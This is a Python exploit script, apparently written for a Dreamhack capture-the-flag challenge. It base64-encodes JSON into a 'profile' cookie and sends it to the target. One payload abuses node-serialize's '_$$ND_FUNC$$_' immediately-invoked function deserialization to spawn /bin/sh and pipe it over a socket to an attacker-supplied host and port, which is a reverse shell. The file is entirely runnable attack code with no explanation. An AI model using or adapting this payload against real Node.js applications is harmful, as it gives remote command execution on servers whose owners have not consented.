import requests
import json
import base64

class Exploit:
    def __init__(self, baseURL):
        self.baseURL = baseURL

    def encode_base64(self, payload_obj):
        json_str = json.dumps(payload_obj)
        b64 = base64.b64encode(json_str.encode()).decode()
        return b64
    
    def send_payload(self, payload_obj):
        print("[+] Sending Payload To Profile Cookie")
        base64_cookie = self.encode_base64(payload_obj)
        cookies = {"profile": base64_cookie}
        print(f"[*] Sending Cookie Profile: {base64_cookie}")
        try:
            response = requests.get(self.baseURL, cookies=cookies)
            if "Set Cookie Success!" in response.text:
                print("[+] Sending Payload Successfully!")
            else:
                print("[-] Failed Sending Payload. Try Again!")
            print(f"[HTTP {response.status_code}] {response.text}")
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
    
    def run_payloads(self, payload_list):
        print("[+] Running payloads...")
        for p in payload_list:
            self.send_payload(p)

if __name__ == "__main__":
    BASE_URL = "http://host1.dreamhack.games:10243/"
    PAYLOAD_RCE = {
        "rce": "_$$ND_FUNC$$_function (){"
               "var net=require('net'),sh=require('child_process').spawn('/bin/sh',[]);"
               "var client=new net.Socket();"
               "client.connect(<YOUR_PORT>,'<YOUR_TCP>',function(){"
               "client.pipe(sh.stdin);"
               "sh.stdout.pipe(client);"
               "sh.stderr.pipe(client);"
               "});}()"
    }
    payloads = [
        {"username": "guest", "country": "Korea"},
        {"username": "guest", "country": PAYLOAD_RCE},
    ]
    exploit = Exploit(BASE_URL)
    exploit.run_payloads(payloads)
